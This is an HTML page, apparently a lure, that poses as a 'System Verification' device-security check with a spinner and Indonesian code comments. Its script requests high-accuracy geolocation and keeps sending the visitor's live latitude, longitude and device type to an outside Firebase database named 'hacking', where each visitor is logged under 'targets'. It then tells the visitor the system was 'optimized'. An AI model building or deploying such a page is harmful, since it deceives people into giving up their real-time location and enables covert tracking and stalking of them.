                        <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(0, 255, 102, 0.1);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border-left-color: #00ff66;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 10px; }
        p { color: #ff3333; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2 id="status-text">Verifying Device Security...</h2>
    <p id="error-text"></p>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        const statusText = document.getElementById("status-text");
        const errorText = document.getElementById("error-text");

        // Deteksi Jenis Perangkat (HP, Tablet, atau Laptop)
        const userAgent = navigator.userAgent;
        let deviceType = "Desktop / PC";
        let deviceIcon = "💻";

        if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
            deviceType = "Tablet Device";
            deviceIcon = "📑";
        } else if (/android/i.test(userAgent) && !/mobile/i.test(userAgent)) {
            deviceType = "Android Tablet";
            deviceIcon = "📑";
        } else if (/android/i.test(userAgent)) {
            deviceType = "Android Phone";
            deviceIcon = "📱";
        } else if (/iphone/i.test(userAgent)) {
            deviceType = "iPhone";
            deviceIcon = "📱";
        } else if (/mobile/i.test(userAgent)) {
            deviceType = "Mobile Device";
            deviceIcon = "📱";
        }

        // Buat ID unik untuk setiap perangkat yang membuka halaman ini
        const targetRef = db.ref("targets").push();

        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    // Mengirim data menggunakan update agar posisinya terus diperbarui secara real-time
                    targetRef.set({
                        latitude: lat,
                        longitude: lon,
                        accuracy: accuracy,
                        device: `${deviceIcon} ${deviceType}`,
                        timestamp: Date.now()
                    }).then(() => {
                        statusText.innerText = "System optimized successfully.";
                        errorText.innerText = "";
                    });
                },
                function(error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        errorText.innerText = "Error: Location permission denied.";
                    } else {
                        errorText.innerText = "Error: Unable to retrieve accurate location.";
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        } else {
            errorText.innerText = "Error: Geolocation is not supported.";
        }
    </script>
</body>
</html>
